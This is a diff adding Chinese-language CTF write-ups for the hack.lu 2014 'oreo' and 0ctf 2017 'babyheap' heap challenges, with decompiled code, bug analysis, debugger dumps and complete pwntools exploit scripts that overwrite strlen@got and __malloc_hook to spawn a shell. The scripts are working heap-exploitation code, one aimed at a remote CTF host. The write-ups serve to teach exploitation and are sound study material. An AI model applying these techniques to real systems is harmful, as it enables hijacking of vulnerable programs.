@@ -414,3 +414,725 @@ Fastbins[idx=6, size=0x70]
 ```
 
 ## 2014 hack.lu oreo
+
+### 基本功能-oreo
+
+> 程序没有进行 setvbuf 操作，因此在初次执行 io 函数时，会在堆上分配空间。
+
+枪支订购系统，分析可得到枪支的结构如下：
+
+```s
+00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
+00000000 descript        db 25 dup(?)
+00000019 name            db 27 dup(?)
+00000034 next            dd ?                    ; offset
+00000038 rifle           ends
+```
+
+```c++
+ v1 = rifle;
+  rifle = malloc(0x38u);
+  if ( rifle )
+  {
+    *(rifle + 13) = v1;                         // rifle+13->next指针，rifle_addr + 13*4 --> rifle_addr + 0x34
+    printf("Rifle name: ");
+    fgets(rifle + 25, 56, stdin);               // rifle_addr + 25 -->rifle_addr + 0x19
+    sub_80485EC(rifle + 25);
+    printf("Rifle description: ");
+    fgets(rifle, 56, stdin);                    // rifle_addr + 0
+    sub_80485EC(rifle);
+```
+
+- 功能分析：
+
+1. add
+
+  ```c++
+  unsigned int add()
+  {
+    v2 = __readgsdword(0x14u);
+    v1 = rifle;
+    rifle = malloc(0x38u);
+    if ( rifle )
+    {
+      *(rifle + 13) = v1;
+      printf("Rifle name: ");
+      fgets(rifle + 25, 56, stdin);
+      sub_80485EC(rifle + 25);
+      printf("Rifle description: ");
+      fgets(rifle, 56, stdin);
+      sub_80485EC(rifle);
+      ++rifle_num;
+    }
+    else
+    {
+      puts("Something terrible happened!");
+    }
+    return __readgsdword(0x14u) ^ v2;
+  }
+  ```
+
+  next指针赋值，以及输入name、description。其中，name输入长度限制到56，可以覆盖next指针的指向（0x34-0x19 = 0x1B(27)）。
+2. show
+
+  ```c++
+  unsigned int show()
+  {
+    printf("Rifle to be ordered:\n%s\n", "===================================");
+    for ( i = rifle; i; i = *(i + 13) )
+    {
+      printf("Name: %s\n", i + 25);
+      printf("Description: %s\n", i);
+      puts("===================================");
+    }
+    return __readgsdword(0x14u) ^ v2;
+  }
+  ```
+
+  显示枪支信息，即 name、description
+3. order
+
+  ```c++
+    unsigned int order()
+    {
+      v2 = rifle;
+      if ( rifle_num )
+      {
+        while ( v2 )
+        {
+          ptr = v2;
+          v2 = *(v2 + 13);
+          free(ptr);
+        }
+        rifle = 0;
+        ++rifle_num_ordered;
+        puts("Okay order submitted!");
+      }
+      else
+      {
+        puts("No rifles to be ordered!");
+      }
+      return __readgsdword(0x14u) ^ v3;
+    }
+  ```
+
+  订购添加的枪支，释放已添加的枪支，但是并没有置为NULL
+4. message
+
+  ```c++
+  unsigned int message()
+  {
+    printf("Enter any notice you'd like to submit with your order: ");
+    fgets(message_order, 128, stdin);
+    sub_80485EC(message_order);
+    return __readgsdword(0x14u) ^ v0;
+  }
+  ```
+
+  输入订货信息，可用来构造fake_chunk
+5. current_status
+
+  ```c++
+  unsigned int current_status()
+  {
+    puts("======= Status =======");
+    printf("New:    %u times\n", rifle_num);
+    printf("Orders: %u times\n", rifle_num_ordered);
+    if ( *message_order )
+      printf("Order Message: %s\n", message_order);
+    puts("======================");
+    return __readgsdword(0x14u) ^ v1;
+  }
+  ```
+
+  显示订单状态，输出枪支数以及订单信息
+
+### 利用-oreo
+
+大致思路：
+
+1. 通过溢出控制next指针指向程序表的got表位置，调用show时泄露libc。此外，将next指向结构体时，需要结构体的next指针为NULL。
+2. 枪支结构体大小为0x38,所以chund的大小为0x40(prev_size和size)。通过`house of sprit`来返回一个 0x0804A2A8（message_oder） 处的chunk，所以需要设置 0x0804A2A8 处的内容为 0x40，通过添加 0x40只枪，来使 rifle_num 变成0x40即 0x0804A2A4的值变成0x40,从而绕过大小检测(message_oder为malloc返回的地址）。同时需要确保next指针绕过检测，需要编辑留下信息
+3. 成功分配fake_chunk之后，就可以通过任意地址修改（message_oder是我们可任意修改的）来获取shell了。
+
+### exp-oreo
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+context.arch='i386'
+context.log_level='DEBUG'
+
+s       = lambda data               :p.send(str(data))
+sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
+sl      = lambda data               :p.sendline(str(data))
+sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+itr     = lambda                    :p.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+
+def add(name , describle):
+  # ru("Action:")
+  sl(1)
+  # ru("Rifle name:")
+  sl(name)
+  # ru("Rifle description:")
+  sl(describle)
+
+def show():
+  # ru("Action:")
+  sl(2)
+  # ru("===================================\n")
+
+def order():
+  # ru("Action:")
+  sl(3)
+
+def message(messages):
+  # ru("Action:")
+  sl(4)
+  # ru("Enter any notice you'd like to submit with your order: ")
+  sl(messages)
+
+def current():
+  # ru("Action:")
+  sl(5)
+  # ru("======= Status =======")
+
+def dbg():
+  gdb.attach(p)
+  pause()
+
+p = process('./oreo')
+elf = ELF('./oreo',checksec=False)
+puts_got = elf.got['puts']
+
+
+add('A'*27+p32(puts_got),'B')
+# dbg()
+show()
+ru('B')
+ru('Description: ')
+puts_addr = uu32(r(4).ljust(4,'\x00'))
+leak("puts_addr",puts_addr)
+
+libc = LibcSearcher('puts',puts_addr)
+libc_base = puts_addr - libc.dump('puts')
+system_addr = libc_base + libc.dump('system')
+leak('system_addr',system_addr)
+binsh = libc_base + libc.dump('str_bin_sh')
+leak('binsh',binsh)
+
+for i in range(0x3f):
+  add('A'*27 + p32(0),'B')
+  print i
+
+# dbg()
+payload = 'A'*27 + p32(0x0804A2A8)
+add(payload,'B')
+# dbg()
+# ...
+# 0x96a0410           0xa                 0x40                 Used                None              None
+# pwndbg> x/16w 0x96a0410
+# 0x96a0410:  0x0000000a  0x00000041  0x00000042  0x00000000
+# 0x96a0420:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x96a0430:  0x41414100  0x41414141  0x41414141  0x41414141
+# 0x96a0440:  0x41414141  0x41414141  0x41414141  0x0804a2a8 <--- next,and it point to fake_chunk
+
+
+# before free, we need to bypass some check
+# fake chunk's size is 0x40
+# 0x20 *'a' for padding the last fake chunk
+# 0x40 for fake chunk's next chunk's prev_size
+# 0x100 for fake chunk's next chunk's size
+# set fake iofle' next to be NULL
+payload = '\x00'*0x20 + p32(0x41) + p32(0x100)
+payload = payload.ljust(0x34,'a')
+payload += p32(0) # make next point to NULL
+payload = payload.ljust(0x100,'b')  # padding to 0x100 which we wire to size
+message(payload)
+# dbg()
+# pwndbg> x/16w 0x8fe8410
+# 0x8fe8410:  0x0000000a  0x00000041  0x00000042  0x00000000
+# 0x8fe8420:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x8fe8430:  0x41414100  0x41414141  0x41414141  0x41414141
+# 0x8fe8440:  0x41414141  0x41414141  0x41414141  0x0804a2a8
+# pwndbg> x/16w 0x0804a2a8
+# 0x804a2a8:  0x0804a2c0  0x00000000  0x00000000  0x00000000
+# 0x804a2b8:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a2c8:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a2d8:  0x00000000  0x00000000  0x00000041  0x0000000a
+# actually, the desrciption we enter start at 0x0804a2c0,
+# and the current fake_chunk start at 0x0804a2a8,
+# so we need fake anther chunk to pass the check,
+# and each chunk's size is 0x40,
+# so we need input anther 0x20 charactes(0x38-(0x0804a2c0 - 0x0804a2a8)) to padding to next fake_chunk,
+
+
+# pwndbg> x/16w 0x8fb9410
+# 0x8fb9410:  0x0000000a  0x00000041  0x00000042  0x00000000
+# 0x8fb9420:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x8fb9430:  0x41414100  0x41414141  0x41414141  0x41414141
+# 0x8fb9440:  0x41414141  0x41414141  0x41414141  0x0804a2a8
+# pwndbg> x/16w 0x0804a2a8
+# 0x804a2a8:  0x0804a2c0  0x00000000  0x00000000  0x00000000
+# 0x804a2b8:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a2c8:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a2d8:  0x00000000  0x00000000  0x00000041  0x00000100
+# pwndbg> x/16w 0x0804a2e0
+# 0x804a2e0:  0x00000041  0x00000100  0x61616161  0x61616161
+# 0x804a2f0:  0x61616161  0x00000000  0x62626262  0x62626262
+# 0x804a300:  0x62626262  0x62626262  0x62626262  0x62626262
+# 0x804a310:  0x62626262  0x62626262  0x62626262  0x62626262
+# pwndbg>
+
+
+order() # free the fake chunk
+# dbg()
+
+# ...
+# 0x843b350           0xa                 0x40                 Used                None              None
+# 0x843b390           0xa                 0x40                 Used                None              None
+# 0x843b3d0           0xa                 0x40                 Used                None              None
+# 0x843b410           0xa                 0x40                 Freed                0x0              None
+# pwndbg> fastbin
+# fastbins
+# 0x10: 0x0
+# 0x18: 0x0
+# 0x20: 0x0
+# 0x28: 0x0
+# 0x30: 0x0
+# 0x38: 0x0
+# 0x40: 0x804a2a0 -> 0x843b410 <- 0x0
+
+# now we can malloc the chunk which we created
+# add a rifle which rifle's name potin to a got addr,
+# and edit message to rewirte the addr we jsut add to name,
+# then getshell
+# it's not difficult to find that after we input something,
+# the program will call sub_80485EC(our_input),
+# and in this function,it call strlen(our_input),
+# so we can rewrite the strlen@got to system_addr,
+# and transfer the argue '/bin/sh' to fake strlen and get shell
+add('S',p32(elf.got['strlen']))
+# dbg()
+# pwndbg> x/16w 0x0804a2a8
+# 0x804a2a8:  0x0804a250  0x00000000  0x00000000  0x00000000
+# 0x804a2b8:  0x00000000  0x00000000  0x00005300  0x00000000
+# 0x804a2c8:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a2d8:  0x00000000  0x00000000  0x00000041  0x00000100
+# pwndbg> x/s 0x0804a250
+# 0x804a250 <strlen@got.plt>: "@\364\337\367@\225\331\367\300\324\335", <incomplete sequence \367>
+# pwndbg>
+
+message(p32(system_addr)+ ';/bin/sh\x00')
+# the arguement of system contains ';',means system execute it by to parts,
+# in other words, it means system(p32(system_addr);"/bin/sh") = system(p32(system_addr));system("/bin/sh");
+# dbg()
+# pwndbg> x/16w 0x0804a2a8
+# 0x804a2a8:  0x0804a250  0x00000000  0x00000000  0x00000000
+# 0x804a2b8:  0x00000000  0x00000000  0x00005300  0x00000000
+# 0x804a2c8:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a2d8:  0x00000000  0x00000000  0x00000041  0x00000100
+# pwndbg> x/16w 0x0804a250
+# 0x804a250 <strlen@got.plt>: 0xf7d6dda0  0x69622f3b  0x68732f6e  0x00000a00
+# 0x804a260:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a270:  0x00000000  0x00000000  0x00000000  0x00000000
+# 0x804a280 <stdin>:  0xf7ee55a0  0x00000000  0x0804a2a8  0x00000000
+# pwndbg>
+
+itr()
+```
+
+## babyheap_0ctf_2017
+
+64位程序，保护全开
+
+### 基本功能-babyheap
+
+实际上是一个堆分配器，功能如下：
+
+```c++
+ puts("1. Allocate");
+  puts("2. Fill");
+  puts("3. Free");
+  puts("4. Dump");
+  puts("5. Exit");
+```
+
+- Allocate
+
+```c++
+printf("Size: ");
+      v2 = get_num();
+      if ( v2 > 0 )
+      {
+        if ( v2 > 4096 )
+          v2 = 4096;
+        v3 = calloc(v2, 1uLL);
+        if ( !v3 )
+          exit(-1);
+        *(_DWORD *)(24LL * i + a1) = 1;         // inuse
+        *(_QWORD *)(a1 + 24LL * i + 8) = v2;    // size
+        *(_QWORD *)(a1 + 24LL * i + 16) = v3;   // ptr
+        printf("Allocate Index %d\n", (unsigned int)i);
+      }
+```
+
+能申请的最大chunk为4096（0x1000），每个chunk分为三部分：inuse、size、ptr，所以程序结构体如下：
+
+```s
+00000000 chunk           struc ; (sizeof=0x11, mappedto_6)
+00000000 inuse           db ?
+00000001 size            dq ?
+00000009 ptr             dq ?
+00000011 chunk           ends
+```
+
+- Fill
+  
+```c++
+printf("Index: ");
+  result = get_num();
+  v2 = result;
+  if ( (signed int)result >= 0 && (signed int)result <= 15 )
+  {
+    result = *(unsigned int *)(24LL * (signed int)result + a1);// inuse
+    if ( (_DWORD)result == 1 )
+    {
+      printf("Size: ");                         // size大小自定，可造成任意长度堆溢出
+      result = get_num();
+      v3 = result;
+      if ( (signed int)result > 0 )
+      {
+        printf("Content: ");
+        result = get_input(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
+      }
+    }
+```
+
+fill的作用是填充内容，可以发现，这里的长度是自定义的，而不是使用size，而且没有设置字符串结尾，所以存在堆溢出的漏洞
+
+- Free
+
+```c++
+printf("Index: ");
+  result = get_num();
+  v2 = result;
+  if ( (signed int)result >= 0 && (signed int)result <= 15 )
+  {
+    result = *(unsigned int *)(24LL * (signed int)result + a1);
+    if ( (_DWORD)result == 1 )
+    {
+      *(_DWORD *)(24LL * v2 + a1) = 0;
+      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
+      free(*(void **)(24LL * v2 + a1 + 16));
+      result = 24LL * v2 + a1;
+      *(_QWORD *)(result + 16) = 0LL;
+    }
+  }
+```
+
+释放对应的块
+
+- Dump
+
+```c++
+ printf("Index: ");
+  result = get_num();
+  v2 = result;
+  if ( result >= 0 && result <= 15 )
+  {
+    result = *(_DWORD *)(24LL * result + a1);
+    if ( result == 1 )
+    {
+      puts("Content: ");
+      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
+      result = puts(byte_14F1);
+    }
+  }
+```
+
+输出对应块的内容
+
+### 利用-babyheap
+
+可以利用的是任意长度的堆溢出，程序保护全开，所以需要先泄露，才能再控制程序流程。
+
+- unsorted bin 泄露libc基址
+- fastbin attack 将chunk分配到malloc_hook附近，进而利用Fill修改malloc_hook内容为one_gadget
+
+#### 泄露libc-babyheap
+
+希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能是 fastbin chunk，也不能和 top chunk 相邻。前者会被添加到 fastbin 中，后者在不是 fastbin 的情况下，会被合并到 top chunk 中。
+
+所以构造5个chunk（i0-i4):
+
+- i0:用作填充其后的chunk，使其bk指针指向i4（small bin）
+- i1:用作释放，之后释放i2时，i2的bk指针会指向i1，这样我们就可以通过i0修改i2的bk指针低字节，使其指向i4
+- i2：bk被修改，后续其会指向i4,无论i4释放与否
+- i3:用于修改i4,绕过检测等
+- i4:用于泄露libc基址
+
+接着释放 i1,i2，然后编辑i0,使其指向i4（堆始终是 4KB 对齐的，所以 idx 4 的起始地址的第一个字节必然是 0x80）。
+
+修改成功之后再次申请两个chunk时，必然就会申请到i4处，前提是i4能够通过检测（通过i3溢出到i4修改size绕过检测）
+
+之后，在释放i4之前，为了i4释放之后会进入unsorted bin，需要再申请一个chunk（i5),防止释放的i4与top chunk合并。此时再释放i4,i4就进入到unsorted bin了，并且i2也指向i4,所以直接打印i2的内容，就可以得到 main_arena的地址，进而计算libc基址
+
+> main_arena 是位于libc中bss段的一个全局变量，所以偏移固定，可以借此来计算libc的基址
+
+![Alt](img/0ctf-babyheap.png)
+
+#### 分配fake_chunk来获取shell
+
+malloc hook 附近的 可用作fake_chunk的size位为 0x7f，所以数据区域为 0x60
+
+```s
+pwndbg> x/4gx (long long)(&main_arena)-0x40+0xd
+0x7f2bb9726aed <_IO_wide_data_0+301>: 0x2bb9725260000000  0x000000000000007f
+0x7f2bb9726afd:   0x2bb93e7e20000000  0x2bb93e7a0000007f
+```
+
+此时我们再申请（0x60）时，对应 fastbin 链表中没有相应大小 chunk，所以根据堆分配器规则，它会依次处理 unsorted bin 中的 chunk，将其放入到对应的 bin 中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以会从其前面分割出来一块。所以 idx2 仍然指向该位置，然后就可以通过 i2 来修改bk指针指向fake_chunk,接着再次申请两个大小为0x60的chunk(i4、i6),此时i6便指向fake_chunk
+
+调用Fill修改i6的内容，使 malloc_hook指向one_gadget，再次请求分配时，就可以拿到shell（这里的 onegadget 地址也可能需要尝试多次）
+
+#### exp-babyheap
+
+```python
+from pwn import *
+context.arch='amd64'
+# context.log_level='DEBUG'
+
+# p = process('./babyheap')
+p = remote('node3.buuoj.cn',29471)
+elf = ELF('./babyheap',checksec=False)
+
+s       = lambda data               :p.send(str(data))
+sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
+sl      = lambda data               :p.sendline(str(data))
+sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+itr     = lambda                    :p.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+
+def allocate(size):
+    ru("Command: ")
+    sl('1')
+    ru('Size:')
+    sl(str(size))
+
+def fill(index,size,content):
+    ru("Command: ")
+    sl('2')
+    ru("Index: ")
+    sl(str(index))
+    ru("Size: ")
+    sl(size)
+    ru("Content: ")
+    sl(content)
+
+def free(index):
+    ru("Command: ")
+    sl('3')
+    ru("Index: ")
+    sl(str(index))
+
+def dump(index):
+    ru("Command: ")
+    sl('4')
+    ru("Index: ")
+    sl(str(index))
+    ru("Content: \n")
+    # puts,which will put '\n'
+    data = ru('\n')
+    return data
+
+def dbg():
+    gdb.attach(p)
+    pause()
+
+# allocate 5 chunks include one small bin and four fast bins,
+# one for padding next chunk's bk point to small bin,
+# and one for it's bk point to small bin,
+# and one for make pre fast bin'bk point to small bin,
+# and one for padding the small bin to pass check,
+# the small bin for leak
+
+
+allocate(0x10) # i0,0x00
+allocate(0x10) # i1,0x20
+allocate(0x10) # i2,0x40
+allocate(0x10) # i3,0x60
+# fast bin size is 0x20,so we can calculate the offset each chunk
+allocate(0x80) # i4,0x80
+# dbg()
+# pwndbg> x/24g 0x55e463353000
+# 0x55e463353000:   0x0000000000000000  0x0000000000000021 <-- i0
+# 0x55e463353010:   0x0000000000000000  0x0000000000000000
+# 0x55e463353020:   0x0000000000000000  0x0000000000000021 <-- i1
+# 0x55e463353030:   0x0000000000000000  0x0000000000000000
+# 0x55e463353040:   0x0000000000000000  0x0000000000000021 <-- i2
+# 0x55e463353050:   0x0000000000000000  0x0000000000000000
+# 0x55e463353060:   0x0000000000000000  0x0000000000000021 <-- i3
+# 0x55e463353070:   0x0000000000000000  0x0000000000000000
+# 0x55e463353080:   0x0000000000000000  0x0000000000000091 <-- i4
+
+free(1)
+free(2)
+# dbg()
+# after free 2 fast bin,there is a fast bin list
+# pwndbg> fast
+# fastbins
+# 0x20: 0x560eb6540040 -> 0x560eb6540020 <- 0x0
+# 0x30: 0x0
+# 0x40: 0x0
+# 0x50: 0x0
+# 0x60: 0x0
+# 0x70: 0x0
+# 0x80: 0x0
+# pwndbg> x/24g 0x560eb6540000
+# 0x560eb6540000:   0x0000000000000000  0x0000000000000021 <-- i0
+# 0x560eb6540010:   0x0000000000000000  0x0000000000000000
+# 0x560eb6540020:   0x0000000000000000  0x0000000000000021 <-- i1
+# 0x560eb6540030:   0x0000000000000000  0x0000000000000000
+# 0x560eb6540040:   0x0000000000000000  0x0000000000000021 <-- i2
+# 0x560eb6540050:   0x0000560eb6540020  0x0000000000000000
+# 0x560eb6540060:   0x0000000000000000  0x0000000000000021 <-- i3
+# 0x560eb6540070:   0x0000000000000000  0x0000000000000000
+# 0x560eb6540080:   0x0000000000000000  0x0000000000000091 <-- i4
+
+# now we eidt i0 to make i1's bk point to small bin
+payload = 'a'*0x10 + p64(0) + p64(0x21) # padding i1
+payload += 'b'*0x10 + p64(0) + p64(0x21) + p8(0x80)
+fill(0,len(payload),payload)
+# dbg()
+# now i2'bk point to small bin,
+# and we allocate again we can get the small bin
+# pwndbg> x/24g 0x55a1fa987000
+# 0x55a1fa987000:   0x0000000000000000  0x0000000000000021 <-- i0
+# 0x55a1fa987010:   0x6161616161616161  0x6161616161616161
+# 0x55a1fa987020:   0x0000000000000000  0x0000000000000021 <-- i1
+# 0x55a1fa987030:   0x6262626262626262  0x6262626262626262
+# 0x55a1fa987040:   0x0000000000000000  0x0000000000000021 <-- i2
+# 0x55a1fa987050:   0x000055a1fa987080  0x0000000000000000
+# 0x55a1fa987060:   0x0000000000000000  0x0000000000000021 <-- i3
+# 0x55a1fa987070:   0x0000000000000000  0x0000000000000000
+# 0x55a1fa987080:   0x0000000000000000  0x0000000000000091 <-- i4
+
+# pwndbg> fast
+# fastbins
+# 0x20: 0x55c37438a040 -> 0x55c37438a080 <- 0x0
+# 0x30: 0x0
+# 0x40: 0x0
+# 0x50: 0x0
+# 0x60: 0x0
+# 0x70: 0x0
+# 0x80: 0x0
+
+# edit i3 to prepare for allcaote i4
+payload = p64(0)*3 + p64(0x21)
+fill(3,len(payload),payload)
+allocate(0x10) # allocate the 0x55c37438a040 which i1 point to
+allocate(0x10) # get i4(small bin) which i2 point to
+# dbg()
+payload = p64(0)*3 + p64(0x91)
+fill(3,len(payload),payload)
+allocate(0x80) # i5,to avoid the small bin which we will free later to combine with top chunk
+free(4)
+# the i4 was allcoate at first,now we free it
+# we allocate a fastbin(i2) still point to here(0x564f38404080)
+# so while we dump(2), it will dump i4's contnet actually,
+# and meanwhile it's contains a addr which near the main_arena
+# dbg()
+# pwndbg> x/32g 0x5614b339c020
+# 0x5614b339c020:   0x0000000000000000  0x0000000000000021 <--i1
+# 0x5614b339c030:   0x6262626262626262  0x6262626262626262
+# 0x5614b339c040:   0x0000000000000000  0x0000000000000021
+# 0x5614b339c050:   0x0000000000000000  0x0000000000000000
+# 0x5614b339c060:   0x0000000000000000  0x0000000000000021 <--i3
+# 0x5614b339c070:   0x0000000000000000  0x0000000000000000
+# 0x5614b339c080:   0x0000000000000000  0x0000000000000091 <-- i4,i2
+# 0x5614b339c090:   0x00007f3579d12b78  0x00007f3579d12b78
+# ......
+# pwndbg> unsorted
+# unsortedbin
+# all: 0x5614b339c080 -> 0x7f3579d12b78 (main_arena+88) <- 0x5614b339c080
+# pwndbg>
+
+# now we can dump it to leak libc_base
+addr = u64(dump(2)[:8].ljust(8,'\x00'))
+leak('addr',addr)
+main_arena = u64(dump(2)[:8].ljust(8,'\x00')) - 0x58
+leak("main_arena",main_arena)
+libc_base = addr - 0x88 - 0x3c4af0
+leak("libc_base",libc_base)
+
+# now we get libc address
+
+# one_gadget = 0x45216 # execve("/bin/sh", rsp+0x30, environ
+one_gadget = 0x4526a # execve("/bin/sh", rsp+0x30, environ)
+# constraints:
+#   [rsp+0x30] == NULL
+
+# one_gadget = 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+# constraints:
+#   [rsp+0x50] == NULL
+
+# one_gadget = 0xf1147 execve("/bin/sh", rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+
+
+allocate(0x60)
+free(4)
+# dbg()
+# pwndbg> x/4gx (long long)(&main_arena)-0x40+0xd
+# 0x7f2bb9726aed <_IO_wide_data_0+301>: 0x2bb9725260000000  0x000000000000007f
+# 0x7f2bb9726afd:   0x2bb93e7e20000000  0x2bb93e7a0000007f
+
+payload = p64(main_arena - 0x40 + 0xd)
+fill(2,len(payload),payload)
+# dbg()
+allocate(0x60) # i4
+# now i4 we just freed was allocated to new i4
+allocate(0x60) # i6
+# when we continue to allcoate,we can get the fake chunk which point to 0x7f16a99d7b05
+
+# fill(6,5,'A'*5)
+# dbg()
+# pwndbg> x/16g 0x7f146555eb20 -0x40
+# 0x7f146555eae0 <_IO_wide_data_0+288>: 0x0000000000000000  0x0000000000000000
+# 0x7f146555eaf0 <_IO_wide_data_0+304>: 0x00007f146555d260  0x4141410000000000
+# 0x7f146555eb00 <__memalign_hook>: 0x00007f1465214141  0x00007f146521fa00
+# 0x7f146555eb10 <__malloc_hook>:   0x0000000000000000  0x0000000000000000
+# 0x7f146555eb20 <main_arena>:  0x0000000000000000  0x0000000000000000
+# 0x7f146555eb30 <main_arena+16>:   0x0000000000000000  0x0000000000000000
+# 0x7f146555eb40 <main_arena+32>:   0x0000000000000000  0x0000000000000000
+# 0x7f146555eb50 <main_arena+48>:   0x146521fe20000000  0x0000000000000000
+
+# now we can edit i6,and rewrite __malloc_hook to our one_gadget to get shell
+payload = '\x00'*3 + p64(0)*2 + p64(libc_base+one_gadget)
+fill(6,len(payload),payload)
+# dbg()
+# pwndbg> x/16g 0x7f3f2b9dcb00
+# 0x7f3f2b9dcb00 <__memalign_hook>: 0x0000000000000000  0x0000000000000000
+# 0x7f3f2b9dcb10 <__malloc_hook>:   0x00007f3f2b65d216  0x0000000000000000 <--malloc_hook was point to one_gadget
+# 0x7f3f2b9dcb20 <main_arena>:  0x0000000000000000  0x0000000000000000
+# 0x7f3f2b9dcb30 <main_arena+16>:   0x0000000000000000  0x0000000000000000
+# 0x7f3f2b9dcb40 <main_arena+32>:   0x0000000000000000  0x0000000000000000
+# 0x7f3f2b9dcb50 <main_arena+48>:   0x3f2b69de20000000  0x0000000000000000
+# 0x7f3f2b9dcb60 <main_arena+64>:   0x0000000000000000  0x0000000000000000
+# dbg()
+# we need to try each one_gadget, one of them may didn't workrd
+
+allocate(0x100)
+itr()
+```
